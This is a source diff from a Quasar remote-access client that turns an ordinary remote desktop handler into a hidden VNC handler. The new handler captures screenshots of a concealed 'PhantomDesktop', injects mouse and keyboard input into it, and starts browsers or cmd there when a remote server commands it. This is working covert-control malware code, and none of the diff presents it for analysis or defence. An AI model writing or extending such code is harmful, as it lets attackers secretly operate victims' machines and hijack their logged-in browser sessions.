@@ -1,38 +1,34 @@
-﻿using Quasar.Client.Helper;
-using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
-using Quasar.Common.Video;
-using Quasar.Common.Video.Codecs;
-using System;
+﻿using System;
+using System.Collections.Concurrent;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Windows.Forms;
 using System.Threading;
-using System.Diagnostics;
-using Quasar.Common.Messages.Monitoring.RemoteDesktop;
+using Quasar.Client.Helper;
+using Quasar.Client.Helper.HVNC;
+using Quasar.Common.Enums;
+using Quasar.Common.Messages;
+using Quasar.Common.Messages.Monitoring.HVNC;
 using Quasar.Common.Messages.other;
-using System.Collections.Concurrent;
-using Quasar.Client.Config;
-using System.Runtime.InteropServices;
+using Quasar.Common.Networking;
+using Quasar.Common.Video;
+using Quasar.Common.Video.Codecs;
 
 namespace Quasar.Client.Messages
 {
-    public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
+    public class HVNCHandler : IMessageProcessor, IDisposable
     {
-        [DllImport("user32.dll", SetLastError = true)]
-        private static extern bool SetThreadDesktop(IntPtr hDesktop);
-
         private UnsafeStreamCodec _streamCodec;
         private BitmapData _desktopData = null;
         private Bitmap _desktop = null;
-        private int _displayIndex = 0;
         private ISender _clientMain;
         private Thread _captureThread;
         private CancellationTokenSource _cancellationTokenSource;
 
-        private bool _useGpu = false;
+        private readonly ImageHandler ImageHandler = new ImageHandler("PhantomDesktop");
+        private readonly InputHandler InputHandler = new InputHandler("PhantomDesktop");
+        private readonly ProcessController ProcessHandler = new ProcessController("PhantomDesktop");
 
         // frame control variables
         private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
@@ -43,35 +39,34 @@ namespace Quasar.Client.Messages
         private const int MAX_BUFFER_SIZE = 10;
 
         private readonly Stopwatch _stopwatch = new Stopwatch();
-        private int _frameCount = 0;
 
-        public override bool CanExecute(IMessage message) => message is GetDesktop ||
-                                                             message is DoMouseEvent ||
-                                                             message is DoKeyboardEvent ||
-                                                             message is GetMonitors;
+        public bool CanExecute(IMessage message)
+        {
+            return message is GetHVNCDesktop || message is DoHVNCInput || message is StartHVNCProcess;
+        }
 
-        public override bool CanExecuteFrom(ISender sender) => true;
+        public bool CanExecuteFrom(ISender sender)
+        {
+            return true;
+        }
 
-        public override void Execute(ISender sender, IMessage message)
+        public void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
-                case GetDesktop msg:
-                    Execute(sender, msg);
+                case GetHVNCDesktop getDesktop:
+                    Execute(sender, getDesktop);
                     break;
-                case DoMouseEvent msg:
-                    Execute(sender, msg);
+                case DoHVNCInput doInput:
+                    InputHandler.Input(doInput.msg, (IntPtr)doInput.wParam, (IntPtr)doInput.lParam);
                     break;
-                case DoKeyboardEvent msg:
-                    Execute(sender, msg);
-                    break;
-                case GetMonitors msg:
-                    Execute(sender, msg);
+                case StartHVNCProcess startHVNCProcess:
+                    Execute(sender, startHVNCProcess);
                     break;
             }
         }
 
-        private void Execute(ISender client, GetDesktop message)
+        private void Execute(ISender client, GetHVNCDesktop message)
         {
             if (message.Status == RemoteDesktopStatus.Stop)
             {
@@ -83,53 +78,13 @@ namespace Quasar.Client.Messages
             }
             else if (message.Status == RemoteDesktopStatus.Continue)
             {
-                // server is requesting more frames
                 Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
                 _frameRequestEvent.Set();
-
-                Debug.WriteLine($"Server requested {message.FramesRequested} more frames. Total pending: {_pendingFrameRequests}");
             }
         }
 
-        private static void RestoreOriginalDesktop()
+        private void StartScreenStreaming(ISender client, GetHVNCDesktop message)
         {
-            Debug.WriteLine($"Attempting to restore desktop with handle: {Settings.OriginalDesktopPointer}");
-
-            if (Settings.OriginalDesktopPointer == IntPtr.Zero)
-            {
-                Debug.WriteLine("ERROR: Original desktop pointer is null/zero");
-                return;
-            }
-
-            bool success = SetThreadDesktop(Settings.OriginalDesktopPointer);
-            int errorCode = Marshal.GetLastWin32Error();
-
-            if (!success)
-            {
-                Debug.WriteLine($"Failed to restore original desktop. Error code: {errorCode}");
-
-                // Common error codes and their meanings
-                if (errorCode == 170) // ERROR_BUSY
-                    Debug.WriteLine("Error: The desktop is currently in use");
-                else if (errorCode == 1400) // ERROR_INVALID_WINDOW_HANDLE
-                    Debug.WriteLine("Error: Invalid desktop handle");
-                else if (errorCode == 5) // ERROR_ACCESS_DENIED
-                    Debug.WriteLine("Error: Access denied - thread might not have permission");
-            }
-            else
-            {
-                Debug.WriteLine("Successfully restored original desktop");
-            }
-        }
-
-        private void StartScreenStreaming(ISender client, GetDesktop message)
-        {
-            Debug.WriteLine("Starting remote desktop session");
-
-            ScreenHelperCPU.InitializeCaptureThread();
-
-            _useGpu = message.UseGPU;
-
             var monitorBounds = ScreenHelperCPU.GetBounds(message.DisplayIndex);
             var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };
 
@@ -140,7 +95,6 @@ namespace Quasar.Client.Messages
             {
                 _streamCodec?.Dispose();
                 _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-                OnReport("Remote desktop session started");
             }
 
             if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
@@ -149,10 +103,8 @@ namespace Quasar.Client.Messages
                 _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
             }
 
-            _displayIndex = message.DisplayIndex;
             _clientMain = client;
 
-            // clear any pending frame requests and existing frames
             ClearFrameBuffer();
             Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);
 
@@ -166,13 +118,11 @@ namespace Quasar.Client.Messages
 
         private void StopScreenStreaming()
         {
-            Debug.WriteLine("Stopping remote desktop session");
-
             _cancellationTokenSource?.Cancel();
 
             if (_captureThread != null && _captureThread.IsAlive)
             {
-                _frameRequestEvent.Set(); // wake up thread
+                _frameRequestEvent.Set();
                 _captureThread.Join();
                 _captureThread = null;
             }
@@ -200,50 +150,39 @@ namespace Quasar.Client.Messages
                 _streamCodec = null;
             }
 
-            // clear the buff
             ClearFrameBuffer();
             Interlocked.Exchange(ref _pendingFrameRequests, 0);
         }
 
         private void BufferedCaptureLoop(CancellationToken cancellationToken)
         {
-            Debug.WriteLine("Starting buffered capture loop");
             _stopwatch.Start();
 
             while (!cancellationToken.IsCancellationRequested)
             {
                 try
                 {
-                    // wait for frame requests if the buffer is full or no frames are requested
                     if (_frameBuffer.Count >= MAX_BUFFER_SIZE || _pendingFrameRequests <= 0)
                     {
-                        Debug.WriteLine($"Waiting for frame requests. Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
                         _frameRequestEvent.WaitOne(500);
 
-                        // if cancellation was requested during the wait
                         if (cancellationToken.IsCancellationRequested)
                             break;
 
                         continue;
                     }
 
-                    // capture frame and add to buffer
                     byte[] frameData = CaptureFrame();
                     if (frameData != null)
                     {
                         _frameBuffer.Enqueue(frameData);
 
-                        // increment frame counter for statistics
-                        _frameCount++;
                         if (_stopwatch.ElapsedMilliseconds >= 1000)
                         {
-                            Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
-                            _frameCount = 0;
                             _stopwatch.Restart();
                         }
                     }
 
-                    // send frames if we have pending requests
                     while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
                     {
                         SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
@@ -251,23 +190,19 @@ namespace Quasar.Client.Messages
                 }
                 catch (Exception ex)
                 {
-                    Debug.WriteLine($"Error in buffered capture loop: {ex.Message}");
-                    Thread.Sleep(100); // Avoid tight loop in case of repeated errors
+                    Thread.Sleep(100);
                 }
             }
-
-            Debug.WriteLine("Buffered capture loop ended");
         }
 
         private byte[] CaptureFrame()
         {
             try
             {
-                _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);
+                _desktop = ImageHandler.Screenshot();
 
                 if (_desktop == null)
                 {
-                    Debug.WriteLine("Error capturing screen: Bitmap is null");
                     return null;
                 }
 
@@ -285,9 +220,8 @@ namespace Quasar.Client.Messages
                     return stream.ToArray();
                 }
             }
-            catch (Exception ex)
+            catch (Exception)
             {
-                Debug.WriteLine($"Error capturing frame: {ex.Message}");
                 return null;
             }
             finally
@@ -308,7 +242,7 @@ namespace Quasar.Client.Messages
 
             try
             {
-                _clientMain.Send(new GetDesktopResponse
+                _clientMain.Send(new GetHVNCDesktopResponse
                 {
                     Image = frameData,
                     Quality = _streamCodec.ImageQuality,
@@ -318,9 +252,8 @@ namespace Quasar.Client.Messages
                     IsLastRequestedFrame = isLastRequestedFrame
                 });
             }
-            catch (Exception ex)
+            catch (Exception)
             {
-                Debug.WriteLine($"Error sending frame to server: {ex.Message}");
             }
         }
 
@@ -329,88 +262,50 @@ namespace Quasar.Client.Messages
             while (_frameBuffer.TryDequeue(out _)) { }
         }
 
-        private void Execute(ISender sender, DoMouseEvent message)
+        private void Execute(ISender client, StartHVNCProcess message)
         {
-            try
+            string name = message.Application;
+            if (name == "Chrome")
             {
-                Screen[] allScreens = Screen.AllScreens;
-                int offsetX = allScreens[message.MonitorIndex].Bounds.X;
-                int offsetY = allScreens[message.MonitorIndex].Bounds.Y;
-                Point p = new Point(message.X + offsetX, message.Y + offsetY);
-
-                // Disable screensaver if active before input
-                if (NativeMethodsHelper.IsScreensaverActive())
-                    NativeMethodsHelper.DisableScreensaver();
-
-                switch (message.Action)
-                {
-                    case MouseAction.LeftDown:
-                    case MouseAction.LeftUp:
-                        NativeMethodsHelper.DoMouseLeftClick(p, message.IsMouseDown);
-                        break;
-                    case MouseAction.RightDown:
-                    case MouseAction.RightUp:
-                        NativeMethodsHelper.DoMouseRightClick(p, message.IsMouseDown);
-                        break;
-                    case MouseAction.MoveCursor:
-                        NativeMethodsHelper.DoMouseMove(p);
-                        break;
-                    case MouseAction.ScrollDown:
-                        NativeMethodsHelper.DoMouseScroll(p, true);
-                        break;
-                    case MouseAction.ScrollUp:
-                        NativeMethodsHelper.DoMouseScroll(p, false);
-                        break;
-                }
+                this.ProcessHandler.Startchrome();
+                return;
             }
-            catch (Exception ex)
+            if (name == "Explorer")
             {
-                Debug.WriteLine($"Error executing mouse event: {ex.Message}");
+                this.ProcessHandler.StartExplorer();
+                return;
             }
+            if (name == "Cmd")
+            {
+                this.ProcessHandler.CreateProc("cmd");
+                return;
+            }
+            if (name == "Edge")
+            {
+                this.ProcessHandler.StartEdge();
+                return;
+            }
+            if (!(name == "Mozilla"))
+            {
+                return;
+            }
+            this.ProcessHandler.StartFirefox();
         }
 
-        private void Execute(ISender sender, DoKeyboardEvent message)
-        {
-            try
-            {
-                if (NativeMethodsHelper.IsScreensaverActive())
-                    NativeMethodsHelper.DisableScreensaver();
-
-                NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Error executing keyboard event: {ex.Message}");
-            }
-        }
-
-        private void Execute(ISender client, GetMonitors message)
-        {
-            int screenCountTotal = DisplayManager.GetDisplayCount();
-
-            Debug.WriteLine(screenCountTotal);
-
-            client.Send(new GetMonitorsResponse { Number = screenCountTotal });
-        }
-
-        /// <summary>
-        /// Disposes all managed and unmanaged resources associated with this message processor.
-        /// </summary>
         public void Dispose()
         {
             Dispose(true);
             GC.SuppressFinalize(this);
-            StopScreenStreaming();
-            _streamCodec?.Dispose();
-            _cancellationTokenSource?.Dispose();
-            _frameRequestEvent?.Dispose();
         }
 
         protected virtual void Dispose(bool disposing)
         {
             if (disposing)
             {
+                Debug.WriteLine("HVNC Handler Disposed");
                 StopScreenStreaming();
+                ImageHandler.Dispose();
+                InputHandler.Dispose();
                 _streamCodec?.Dispose();
                 _cancellationTokenSource?.Dispose();
                 _frameRequestEvent?.Dispose();
